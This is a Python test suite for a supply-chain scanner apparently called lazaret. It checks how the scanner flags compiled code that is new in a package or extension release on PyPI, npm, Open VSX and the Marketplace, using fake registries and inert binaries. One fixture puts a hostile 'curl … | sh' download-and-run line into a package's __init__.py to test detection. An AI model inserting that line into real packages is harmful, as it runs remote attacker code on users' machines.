"""RA-13 (registry/prior.py): compiled code new in a release, and the comparison for Open VSX's and the Marketplace's
releases and for `lazaret guard <editor>`'s extension updates.

A release whose files ship compiled code (an ELF, Mach-O or PE file, or a .so, .pyd, .dylib, .dll, .node or .exe that
is not text) when its established predecessor's files of the same kind ship none is SC-NEW-COMPILED-CODE, MAJOR, and
CRITICAL beside an SC-NEW-INDICATOR: Shai-Hulud's PyPI wave (June 2026) gave pure-Python packages native extensions
that run on import; GlassWorm v2 (April 2026) activated Open VSX extensions through updates that brought .node
binaries. Like with like: an sdist with the predecessor's sdist, a wheel with its wheels (a wheel tagged for a platform
ships compiled code by its name), a .vsix with its .vsix files.

The registries are fakes served by URL (test_prior_release's Registry for PyPI and npm; test_openvsx's answers for Open
VSX; test_vsmarketplace's gallery; test_guard_editor's gallery and fake editor for the guard); nothing reaches the
network. The compiled files are inert: an ELF header and zeros (_review_support.ELF), never run, nothing real."""

import datetime
import hashlib
import io
import json
import os
import unittest
import zipfile
from unittest import mock

from lazaret.registry import guard as G
from lazaret.registry import prior, repo
from lazaret.registry.ecosystems import vsmarketplace as vsm
from lazaret.scanner import _native
from tests.registry import test_guard_editor as tge
from tests.registry import test_guard_prior as tgp
from tests.registry import test_vsmarketplace as tvm
from tests.registry._review_support import B64_DATA, ELF, manifest, tarball
from tests.registry.test_guard import context
from tests.registry.test_openvsx import document, history, query_entry, responses
from tests.registry.test_prior_release import NPM, ON, RELEASE, Registry, iso, npm_registry, scan_npm
from tests.registry.test_registry_go_crates import Served
from tests.registry.test_vsix import ext_manifest, vsix

DAY = datetime.timedelta(days=1)
FILES = "https://files.pythonhosted.org/packages/xx/"


def wheel(version, files):
    """A wheel of `pkg` holding `files` ({path: text or bytes}) beside its metadata."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for path, content in files.items():
            z.writestr(path, content)
        z.writestr(f"pkg-{version}.dist-info/METADATA", f"Metadata-Version: 2.1\nName: pkg\nVersion: {version}\n")
        z.writestr(f"pkg-{version}.dist-info/WHEEL", "Wheel-Version: 1.0\n")
        z.writestr(f"pkg-{version}.dist-info/RECORD", "")
    return buf.getvalue()


def sdist(version, files):
    return tarball({"PKG-INFO": f"Metadata-Version: 2.1\nName: pkg\nVersion: {version}\n",
                    "pyproject.toml": '[project]\nname = "pkg"\n', **files}, root=f"pkg-{version}/")


PURE = {"pkg/__init__.py": "DATA = 1\n"}
NATIVE = {"pkg/__init__.py": "from pkg import _native\n", "pkg/_native.abi3.so": ELF}
BLOB = {"pkg/__init__.py": f"DATA = '{B64_DATA}'\n"}


class PypiTests(unittest.TestCase):
    """pkg 1.0 (30 days before) and 1.1, as the Simple API lists them; 1.1's files scanned as scan_package scans them."""

    def registry(self, old, new):
        """`old`, `new`: {filename: bytes} of 1.0's and 1.1's files."""
        reg, files = Registry(), []
        for when, named in ((RELEASE - 30 * DAY, old), (RELEASE, new)):
            for filename, data in named.items():
                reg.files[FILES + filename] = data
                files.append({"filename": filename, "url": FILES + filename, "upload-time": iso(when),
                              "hashes": {"sha256": hashlib.sha256(data).hexdigest()}})
        reg.docs["https://pypi.org/simple/pkg/"] = {"name": "pkg", "versions": ["1.0", "1.1"], "files": files}
        self.new = new
        return reg

    def scan(self, reg, env=ON):
        arts = [{"url": FILES + f, "container": "zip" if f.endswith(".whl") else "tgz",
                 "artifact": "wheel" if f.endswith(".whl") else "sdist", "filename": f,
                 "entry": {"digests": {"sha256": hashlib.sha256(d).hexdigest()}}} for f, d in self.new.items()]
        with mock.patch.object(repo, "resolve_pypi", return_value=repo.Resolution("1.1", arts)), \
                mock.patch.object(repo, "_fetch", reg.fetch), mock.patch.object(repo, "http_bytes", reg.bytes), \
                mock.patch.dict(os.environ, env):
            return repo.scan_package("pypi", "pkg", "1.1")

    def found(self, res, rule=prior.COMPILED_RULE):
        return [i for i in res["issues"] if i["rule"] == rule]

    def test_a_pure_python_predecessor_and_a_release_with_an_abi3_extension(self):
        reg = self.registry({"pkg-1.0-py3-none-any.whl": wheel("1.0", PURE)},
                            {"pkg-1.1-cp311-abi3-manylinux_2_17_x86_64.whl": wheel("1.1", NATIVE)})
        res = self.scan(reg)
        # (the release alone is OK: a wheel's binary is inventory, SC-BINARY INFO)
        self.assertEqual(res["verdict"], "WARN", res["verdictReason"])
        [found] = self.found(res)
        self.assertEqual((found["sev"], found["file"]), ("MAJOR", "pkg/_native.abi3.so"))
        self.assertEqual(found["msg"], "Compiled code new in this release: pkg/_native.abi3.so; 1.0, published 30 days "
                                       "before it, ships none in its wheels.")
        self.assertIn("ensmallen", found["why"])
        self.assertEqual(res["priorRelease"], {"version": "1.0", "publishedBefore": "30 days",
                                               "files": ["pkg-1.0-py3-none-any.whl"], "newRules": [],
                                               "newCompiledCode": ["pkg/_native.abi3.so"]})
        self.assertEqual(res["artifacts"][0]["compiledCode"], ["pkg/_native.abi3.so"])
        self.assertEqual(self.found(res, prior.RULE), [])
        # off: the release alone, OK, nothing of the predecessor read
        reg.fetched.clear()
        off = self.scan(reg, env={prior.OFF_ENV: "1"})
        self.assertEqual((off["verdict"], "priorRelease" in off), ("OK", False))
        self.assertFalse([u for u in reg.fetched if "pkg-1.0" in u or "simple" in u], reg.fetched)

    def test_with_another_new_indicator_it_is_critical(self):
        both = {**NATIVE, **BLOB, "pkg/__init__.py": f"DATA = '{B64_DATA}'\nfrom pkg import _native\n"}
        reg = self.registry({"pkg-1.0-py3-none-any.whl": wheel("1.0", PURE)},
                            {"pkg-1.1-cp311-abi3-manylinux_2_17_x86_64.whl": wheel("1.1", both)})
        res = self.scan(reg)
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
        self.assertEqual([i["sev"] for i in self.found(res, prior.RULE)], ["CRITICAL"])        # (SC-B64, new)
        [found] = self.found(res)
        self.assertEqual(found["sev"], "CRITICAL")
        self.assertTrue(found["msg"].endswith("A weaker indicator is new in this release too (SC-NEW-INDICATOR)."))
        self.assertEqual(res["priorRelease"]["newRules"], ["SC-B64"])
        # (the predecessor's wheel scanned once, for both)
        self.assertEqual(reg.fetched.count(FILES + "pkg-1.0-py3-none-any.whl"), 1)

    def test_a_package_that_always_shipped_compiled_code(self):
        # its platform wheels: compiled code by their names, nothing of them downloaded
        reg = self.registry({"pkg-1.0-cp311-abi3-manylinux_2_17_x86_64.whl": wheel("1.0", NATIVE),
                             "pkg-1.0-py3-none-any.whl": wheel("1.0", PURE)},
                            {"pkg-1.1-cp312-abi3-manylinux_2_17_x86_64.whl": wheel("1.1", NATIVE)})
        res = self.scan(reg)
        self.assertEqual((res["verdict"], self.found(res)), ("OK", []))
        self.assertEqual((res["priorRelease"]["newCompiledCode"], res["priorRelease"]["files"]), ([], []))
        self.assertFalse([u for u in reg.fetched if "pkg-1.0" in u], reg.fetched)
        # a pure-Python wheel's name that holds a .so all the same: scanned, it has some
        reg = self.registry({"pkg-1.0-py3-none-any.whl": wheel("1.0", NATIVE)},
                            {"pkg-1.1-py3-none-any.whl": wheel("1.1", {**NATIVE, "pkg/_more.so": ELF})})
        res = self.scan(reg)
        self.assertEqual((res["verdict"], self.found(res)), ("OK", []))
        self.assertEqual(res["priorRelease"]["files"], ["pkg-1.0-py3-none-any.whl"])

    def test_an_sdist_with_the_sdist_and_a_wheel_with_the_wheels(self):
        # a pure-Python sdist beside platform wheels is how a native project ships: nothing new
        old = {"pkg-1.0.tar.gz": sdist("1.0", PURE), "pkg-1.0-cp311-cp311-win_amd64.whl": wheel("1.0", NATIVE)}
        new = {"pkg-1.1.tar.gz": sdist("1.1", PURE), "pkg-1.1-cp312-cp312-win_amd64.whl": wheel("1.1", NATIVE)}
        res = self.scan(self.registry(old, new))
        self.assertEqual((res["verdict"], self.found(res)), ("OK", []), res["verdictReason"])
        # the release's sdist with a compiled file its predecessor's sdist had none of: new, in the sdist
        new = {"pkg-1.1.tar.gz": sdist("1.1", {**PURE, "pkg/_native.so": ELF}),
               "pkg-1.1-cp312-cp312-win_amd64.whl": wheel("1.1", NATIVE)}
        reg = self.registry(old, new)
        res = self.scan(reg)
        [found] = self.found(res)
        self.assertEqual((found["sev"], found["file"], found["artifact"]),
                         ("MAJOR", "pkg-1.1.tar.gz/pkg/_native.so", "pkg-1.1.tar.gz"))
        self.assertTrue(found["msg"].endswith("ships none in its sdist."), found["msg"])
        self.assertEqual(res["priorRelease"]["files"], ["pkg-1.0.tar.gz"])               # (the wheel by its name)

    def test_a_suspicious_release_is_not_asked(self):
        evil = {"pkg/__init__.py": "import os\nos.system('curl https://e.invalid/x | sh')\n", "pkg/_native.so": ELF}
        reg = self.registry({"pkg-1.0-py3-none-any.whl": wheel("1.0", PURE)},
                            {"pkg-1.1-py3-none-any.whl": wheel("1.1", evil)})
        res = self.scan(reg)
        self.assertEqual((res["verdict"], "priorRelease" in res), ("SUSPICIOUS", False))
        self.assertFalse([u for u in reg.fetched if "pkg-1.0" in u])


class NpmTests(unittest.TestCase):
    def test_a_node_addon_new_in_the_release(self):
        pure = tarball({"package.json": manifest(main="index.js"), "index.js": "module.exports = 1;\n"})
        addon = tarball({"package.json": manifest(main="index.js"), "build/Release/kit.node": ELF,
                         "index.js": "module.exports = require('./build/Release/kit.node');\n"})
        reg = npm_registry("files-kit", {"1.0.0": (RELEASE - 30 * DAY, pure), "1.0.1": (RELEASE, addon)})
        res = scan_npm(reg, "files-kit", "1.0.1")
        self.assertEqual(res["verdict"], "WARN")                                       # (SC-BINARY, MAJOR, already)
        [found] = [i for i in res["issues"] if i["rule"] == prior.COMPILED_RULE]
        self.assertEqual((found["sev"], found["file"]), ("MAJOR", "build/Release/kit.node"))
        self.assertTrue(found["msg"].endswith("ships none in its package."), found["msg"])
        # one that had it: nothing new
        reg = npm_registry("files-kit", {"1.0.0": (RELEASE - 30 * DAY, addon), "1.0.1": (RELEASE, addon)})
        res = scan_npm(reg, "files-kit", "1.0.1")
        self.assertEqual(([i for i in res["issues"] if i["rule"] == prior.COMPILED_RULE],
                          res["priorRelease"]["newCompiledCode"]), ([], []))
        self.assertIn(f"{NPM}files-kit/-/files-kit-1.0.0.tgz", reg.fetched)


class PartsTests(unittest.TestCase):
    def test_what_compiled_code_is(self):
        native = lambda raw: repo._native_program(raw)                                  # noqa: E731
        for rel, raw, want in (("pkg/_x.abi3.so", ELF, True), ("lib/libz.so.1.2.13", ELF, True),
                               ("bin/tool", ELF, True), ("x.dll", b"MZ\x90\x00" + b"\x00" * 200, True),
                               ("a.node", b"\xcf\xfa\xed\xfe" + b"\x00" * 200, True),
                               ("m.wasm", b"\0asm\x01\0\0\0" + b"\x00" * 200, False),
                               ("C.class", b"\xca\xfe\xba\xbe" + b"\x00" * 200, False),
                               ("x.so", b"\x00\x01\x02" * 100, True),        # (a loader's name, bytes not text)
                               ("x.so", b"not a library\n" * 20, False), ("x.bin", b"\x00\x01\x02" * 100, False)):
            with self.subTest(rel=rel, raw=raw[:4]):
                self.assertIs(repo._compiled_code(rel, raw, native(raw)), want)

    def test_a_wheels_name_says_compiled_code(self):
        for name, want in (("p-1.0-py3-none-any.whl", False), ("p-1.0-py2.py3-none-any.whl", False),
                           ("p-1.0-cp311-abi3-manylinux_2_17_x86_64.whl", True), ("p-1.0-py3-none-win_amd64.whl", True),
                           ("p-1.0-1-cp312-cp312-macosx_11_0_arm64.whl", True), ("p-1.0.tar.gz", False)):
            with self.subTest(name):
                kind = "wheel" if name.endswith(".whl") else "sdist"
                self.assertIs(prior.compiled_by_name({"filename": name, "artifact": kind}), want)

    def test_a_scan_lists_its_compiled_code(self):
        data = wheel("1.0", {**NATIVE, "pkg/data.bin": b"\x00\x01" * 50, "pkg/m.wasm": b"\0asm\x01\0\0\0" * 30})
        r = repo._scan_artifact(data, "zip", "wheel", False, repo.Budget())
        self.assertEqual(r["compiledCode"], ["pkg/_native.abi3.so"])
        self.assertEqual(G.compiled_of(r), ["pkg/_native.abi3.so"])


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
@mock.patch.dict(os.environ, ON)
class GuardPypiTests(unittest.TestCase):
    """lazaret guard (pip) on a wheel in the window: an OK verdict whose file ships compiled code is compared too, the
    predecessor's compiled code kept with its verdict (test_guard_prior's fetcher and counting scanner)."""

    def check(self, cache, old, new_name, new):
        answers, files = {}, []
        for version, when, name, data in (("1.0", tgp.days_ago(30), "pkg-1.0-py3-none-any.whl", old),
                                          ("1.1", tgp.days_ago(2), new_name, new)):
            answers[FILES + name] = data
            files.append({"filename": name, "url": FILES + name, "upload-time": tgp.iso(when),
                          "hashes": {"sha256": hashlib.sha256(data).hexdigest()}})
        answers["https://pypi.org/simple/pkg/"] = json.dumps({"name": "pkg", "versions": ["1.0", "1.1"],
                                                              "files": files}).encode()
        ctx = context(tool="pip")
        ctx.scanner.close()
        ctx.scanner = tgp.CountingScanner(cache)
        f = {"url": files[1]["url"], "hash": "sha256:" + files[1]["hashes"]["sha256"],
             "upload-time": files[1]["upload-time"], "filename": new_name}
        return G.check_file(ctx, tgp.Fetcher(answers, tgp.days_ago(2)), "pkg", "1.1", f), ctx.scanner

    def test_an_ok_wheel_with_compiled_code_its_predecessor_had_none_of(self):
        cache = G.VerdictCache(None)
        name = "pkg-1.1-cp311-abi3-manylinux_2_17_x86_64.whl"
        # Reuse the artifacts themselves for the cache-hit check.  ZipFile stamps
        # newly written members with the current time, so rebuilding the same
        # logical wheel later can give it a different digest.  That is correctly
        # a cache miss, not evidence that this exact artifact was not cached.
        old, new = wheel("1.0", PURE), wheel("1.1", NATIVE)
        check, scanner = self.check(cache, old, name, new)
        self.assertEqual((check.verdict, check.blocked, scanner.scans), ("WARN", [], 2))
        self.assertTrue(check.indicators[0].startswith("SC-NEW-COMPILED-CODE (MAJOR) pkg/_native.abi3.so"),
                        check.indicators)
        self.assertEqual(check.prior["newCompiledCode"], ["pkg/_native.abi3.so"])
        # the verdict cached WARN with the comparison; the predecessor's with its compiled code (none)
        check, scanner = self.check(cache, old, name, new)
        self.assertEqual((check.verdict, scanner.scans), ("WARN", 0))
        older = cache.get(G.VerdictCache.key("pypi", "pkg", "1.0",
                                             "sha256:" + hashlib.sha256(old).hexdigest()))
        self.assertEqual((older["verdict"], older["compiled"]), ("OK", []))

    def test_a_predecessor_cached_without_its_compiled_code_is_scanned_again(self):
        # (a verdict cached before RA-13 has no `compiled`: the comparison does not take its absence for none)
        cache = G.VerdictCache(None)
        old = wheel("1.0", NATIVE)
        key = G.VerdictCache.key("pypi", "pkg", "1.0", "sha256:" + hashlib.sha256(old).hexdigest())
        cache.data[key] = {"verdict": "OK", "reason": "no supply-chain indicators", "indicators": [], "published": None}
        check, scanner = self.check(cache, old, "pkg-1.1-py3-none-any.whl", wheel("1.1", NATIVE))
        self.assertEqual((check.verdict, check.prior["newCompiledCode"], scanner.scans), ("OK", [], 2))
        self.assertEqual(cache.get(key)["compiled"], ["pkg/_native.abi3.so"])


# ---------------------------------------------------------------- Open VSX and the Marketplace
def extension(version, code="exports.activate = () => 1;\n", **files):
    return vsix({"package.json": ext_manifest(name="tool", publisher="acme", version=version, main="./extension.js"),
                 "extension.js": code, **files})


OLD_TIME, NEW_TIME = "2026-09-01T00:00:00Z", "2026-10-06T08:18:12.286437Z"     # (test_openvsx.document's timestamp)


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class OpenVSXTests(unittest.TestCase):
    """acme.tool 1.0.0 (Sep 1) and 1.1.0 (Oct 6), as Open VSX's API and query API answer for them."""

    def served(self, old, new):
        out = responses("acme", "tool", "1.1.0", {"universal": new})
        out.update(responses("acme", "tool", "1.0.0", {"universal": old}, latest=False))
        out.update(history("acme.tool", [query_entry("acme.tool", "1.1.0", NEW_TIME),
                                         query_entry("acme.tool", "1.0.0", OLD_TIME)]))
        return Served(out)

    def scan(self, served, env=ON):
        with mock.patch.object(repo, "module_transport", served), \
                mock.patch.object(repo._base.Fetch, "_wait_turn", lambda self, url: None), mock.patch.dict(os.environ, env):
            return repo.scan_package("openvsx", "acme.tool", "1.1.0")

    def test_an_update_that_brings_a_node_binary(self):
        served = self.served(extension("1.0.0"), extension("1.1.0", **{"native/addon.node": ELF}))
        res = self.scan(served)
        self.assertEqual(res["verdict"], "WARN")
        [found] = [i for i in res["issues"] if i["rule"] == prior.COMPILED_RULE]
        self.assertEqual((found["sev"], found["file"]), ("MAJOR", "native/addon.node"))
        self.assertEqual(found["msg"], "Compiled code new in this release: native/addon.node; 1.0.0, published 35 days "
                                       "before it, ships none in its .vsix files.")
        self.assertEqual(res["priorRelease"]["files"], ["acme.tool-1.0.0.vsix"])
        # (the predecessor's file was checked against its SHA-256, and the history read once)
        self.assertEqual(served.urls().count("https://open-vsx.org/api/-/query?extensionId=acme.tool"
                                             "&includeAllVersions=true&size=1000&offset=0"), 1)
        # one that shipped it: nothing new
        served = self.served(extension("1.0.0", **{"native/addon.node": ELF}),
                             extension("1.1.0", **{"native/addon.node": ELF}))
        self.assertEqual(self.scan(served)["priorRelease"]["newCompiledCode"], [])

    def test_an_indicator_new_by_the_comparison(self):
        served = self.served(extension("1.0.0"), extension("1.1.0", code=f"exports.activate = () => '{B64_DATA}';\n"))
        res = self.scan(served)
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
        [found] = [i for i in res["issues"] if i["rule"] == prior.RULE]
        self.assertEqual(found["sev"], "CRITICAL")
        self.assertIn("(SC-B64) is new in this release: 1.0.0, published 35 days before it", found["msg"])
        self.assertEqual(res["priorRelease"]["newRules"], ["SC-B64"])
        # the predecessor had it: WARN; off: WARN, no comparison
        served = self.served(extension("1.0.0", code=f"exports.activate = () => '{B64_DATA}';\n"),
                             extension("1.1.0", code=f"exports.activate = () => '{B64_DATA}';\n"))
        self.assertEqual(self.scan(served)["verdict"], "WARN")
        res = self.scan(self.served(extension("1.0.0"), extension("1.1.0", code=f"exports.activate = () => '{B64_DATA}';\n")),
                        env={prior.OFF_ENV: "1"})
        self.assertEqual((res["verdict"], "priorRelease" in res), ("WARN", False))

    def test_a_pre_release_is_not_a_releases_predecessor_and_no_history_is_no_finding(self):
        served = self.served(extension("1.0.0"), extension("1.1.0", **{"native/addon.node": ELF}))
        served.responses.update(history("acme.tool", [query_entry("acme.tool", "1.1.0", NEW_TIME),
                                                      query_entry("acme.tool", "1.0.0", OLD_TIME, pre=True)]))
        self.assertEqual(self.scan(served)["priorRelease"],
                         {"notCompared": "no release published a week or more before this one"})
        served = self.served(extension("1.0.0"), extension("1.1.0", **{"native/addon.node": ELF}))
        del served.responses["https://open-vsx.org/api/-/query?extensionId=acme.tool&includeAllVersions=true&size=1000"
                             "&offset=0"]
        res = self.scan(served)
        self.assertEqual((res["verdict"], [i for i in res["issues"] if i["rule"] == prior.COMPILED_RULE]), ("WARN", []))
        self.assertIn("notCompared", res["priorRelease"])


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class MarketplaceTests(unittest.TestCase):
    def test_an_update_compared_by_the_gallerys_versions(self):
        old, new = extension("1.0.0"), extension("1.1.0", **{"native/addon.node": ELF})
        entries = []
        for version, when, data in (("1.1.0", NEW_TIME, new), ("1.0.0", OLD_TIME, old)):
            e = tvm.version_entry("acme", "tool", version)
            e["lastUpdated"] = when
            entries.append((e, data))
        gallery = tvm.served(tvm.extension("acme", "tool", [e for e, _d in entries]), entries)
        with mock.patch.object(repo, "module_transport", gallery), \
                mock.patch.object(repo._base.Fetch, "_wait_turn", lambda self, url: None), mock.patch.dict(os.environ, ON):
            res = repo.scan_package("vscode", "acme.tool", "1.1.0")
        [found] = [i for i in res["issues"] if i["rule"] == prior.COMPILED_RULE]
        self.assertEqual((found["sev"], res["priorRelease"]["version"]), ("MAJOR", "1.0.0"))
        # the release's resolution, and the history's query, whose answer the predecessor's resolution reads too
        self.assertEqual(len([b for b in gallery.bodies if b["flags"] & vsm.LATEST_ONLY_FLAG == 0]), 2)


# ---------------------------------------------------------------- lazaret guard <editor> --update-extensions
def ovsx_add(gallery, version, when, data):
    """A version of acme.tool on test_guard_editor's Open VSX gallery: its query entry, its file, digest and
    manifest, and its version's document (which the predecessor's resolution reads)."""
    e = tge.ovsx_entry("acme.tool", version, data, when=when)
    gallery.entries.append(e)
    gallery.files[e["files"]["download"]] = data
    gallery.files[e["files"]["sha256"]] = hashlib.sha256(data).hexdigest().encode()
    gallery.files[e["files"]["manifest"]] = tge.manifest_bytes(data)
    gallery.files[f"https://open-vsx.org/api/acme/tool/{version}"] = json.dumps(
        document("acme", "tool", version, timestamp=when)).encode()


def ago(days):
    return (tge.NOW - datetime.timedelta(days=days)).strftime("%Y-%m-%dT%H:%M:%S.000000Z")


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class GuardUpdateTests(tge.EditorCase):
    """`lazaret guard codium --update-extensions` (the real scanner): acme.tool 1.0.0, installed and 60 days old, and
    1.1.0, 3 days old (in the window, older than --min-age), its update."""

    def update(self, new):
        ovsx_add(self.gallery, "1.0.0", ago(60), extension("1.0.0"))
        ovsx_add(self.gallery, "1.1.0", ago(3), new)
        self.set_state(installed={"acme.tool": "1.0.0"})
        tge.record_profile(os.path.join(self.extdir, "extensions.json"),
                           ("acme.tool", "1.0.0", tge.from_gallery("ovsx-acme-tool")))
        with mock.patch.dict(os.environ, ON):
            code = self.run_guard("--update-extensions", real_scanner=True)
        [check] = [c for c in self.ctx.checks if c.name == "acme.tool"]
        return code, check

    def test_an_update_with_an_indicator_its_predecessor_did_not_have_is_blocked(self):
        code, check = self.update(extension("1.1.0", code=f"exports.activate = () => '{B64_DATA}';\n"))
        self.assertEqual((code, check.verdict), (G.EXIT_BLOCKED, "SUSPICIOUS"), self.out)
        self.assertTrue(check.indicators[0].startswith("SC-NEW-INDICATOR (CRITICAL)"), check.indicators)
        self.assertEqual(check.to_json()["priorRelease"], {"version": "1.0.0", "publishedBefore": "57 days",
                                                           "files": ["acme.tool-1.0.0.vsix"], "newRules": ["SC-B64"]})
        self.assertEqual(self.installs(), [])

    def test_an_update_that_brings_a_node_binary(self):
        code, check = self.update(extension("1.1.0", **{"native/addon.node": ELF}))
        self.assertEqual((code, check.verdict), (0, "WARN"), self.out)
        self.assertTrue(check.indicators[0].startswith("SC-NEW-COMPILED-CODE (MAJOR) native/addon.node: Compiled code "
                                                       "new in this release"), check.indicators)
        self.assertEqual(check.prior["newCompiledCode"], ["native/addon.node"])
        self.assertEqual(self.state()["installed"], {"acme.tool": "1.1.0"})             # (WARN: --block-warn blocks)
        # off: no comparison, nothing of 1.0.0 asked for
        self.gallery.calls.clear()
        with mock.patch.dict(os.environ, {prior.OFF_ENV: "1"}):
            self.set_state(installed={"acme.tool": "1.0.0"})
            self.run_guard("--update-extensions", real_scanner=True)
        [check] = [c for c in self.ctx.checks if c.name == "acme.tool"]
        self.assertEqual((check.verdict, check.prior), ("WARN", None))
        self.assertFalse(self.gallery.asked("tool/1.0.0"), self.gallery.calls)


if __name__ == "__main__":
    unittest.main()
